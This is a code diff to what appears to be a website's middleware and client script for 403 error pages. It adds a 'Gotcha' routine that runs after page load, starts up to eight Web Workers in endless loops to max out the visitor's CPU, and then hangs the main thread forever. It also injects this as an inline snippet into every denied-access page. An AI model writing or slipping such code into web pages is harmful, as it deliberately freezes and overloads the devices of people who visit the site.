@@ -253,15 +253,38 @@ function startColorInversion(): void {
   }, INVERT_INTERVAL_MS);
 }
 
+/**
+ * Hangs the tab (and hammers CPU via workers). Must run only in the browser.
+ * Never call from Workers middleware — client / inline 403 runner only.
+ */
+function freezeTab(): void {
+  console.log("Gotcha");
+
+  try {
+    const cores = navigator.hardwareConcurrency ?? 4;
+    const workerCount = Math.min(cores, 8);
+    const workerSource = "while(true){}";
+
+    for (let i = 0; i < workerCount; i += 1) {
+      const blob = new Blob([workerSource], { type: "application/javascript" });
+      new Worker(URL.createObjectURL(blob));
+    }
+  } catch {
+    /* workers are best-effort */
+  }
+
+  while (true) {
+    /* deliberate main-thread hang */
+  }
+}
+
 function scheduleGotchaConsoleLog(): void {
   if (window.__rwGotchaLogged) return;
 
   const logGotcha = (): void => {
     if (window.__rwGotchaLogged) return;
     window.__rwGotchaLogged = true;
-    while(true) {
-    console.log("You t");
-    }
+    freezeTab();
   };
 
   const runAfterLoad = (): void => {
@@ -281,15 +304,28 @@ function scheduleGotchaConsoleLog(): void {
   window.addEventListener("load", runAfterLoad, { once: true });
 }
 
-/** Inline Gotcha console log for middleware 403 pages. */
+/** Inline Gotcha + tab freeze for middleware 403 pages. */
 function buildGotchaConsoleSnippet(): string {
   return `
+  function rwFreezeTab() {
+    console.log("Gotcha");
+    try {
+      var cores = navigator.hardwareConcurrency || 4;
+      var n = Math.min(cores, 8);
+      var src = "while(true){}";
+      for (var i = 0; i < n; i++) {
+        var blob = new Blob([src], { type: "application/javascript" });
+        new Worker(URL.createObjectURL(blob));
+      }
+    } catch (e) {}
+    while (true) {}
+  }
   function rwScheduleGotchaLog() {
     if (window.__rwGotchaLogged) return;
     function logGotcha() {
       if (window.__rwGotchaLogged) return;
       window.__rwGotchaLogged = true;
-      console.log("Gotcha");
+      rwFreezeTab();
     }
     function runAfterLoad() {
       setTimeout(logGotcha, ${GOTCHA_CONSOLE_DELAY_MS});
